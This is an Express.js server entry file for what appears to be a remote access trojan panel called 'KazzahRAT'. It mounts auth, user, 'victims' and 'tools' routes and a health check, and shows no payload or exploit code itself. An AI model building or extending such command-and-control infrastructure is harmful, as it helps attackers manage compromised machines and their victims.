import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import authRoutes from './routes/auth.js';
import userRoutes from './routes/users.js';
import victimRoutes from './routes/victims.js';
import toolRoutes from './routes/tools.js';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors({
  origin: ['http://localhost:3000', 'https://kazzah-rat.vercel.app'],
  credentials: true
}));
app.use(express.json({ limit: '50mb' }));

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/users', userRoutes);
app.use('/api/victims', victimRoutes);
app.use('/api/tools', toolRoutes);

app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', message: 'KazzahRAT API is running' });
});

app.listen(PORT, () => {
  console.log(`🔥 Server running on port ${PORT}`);
});
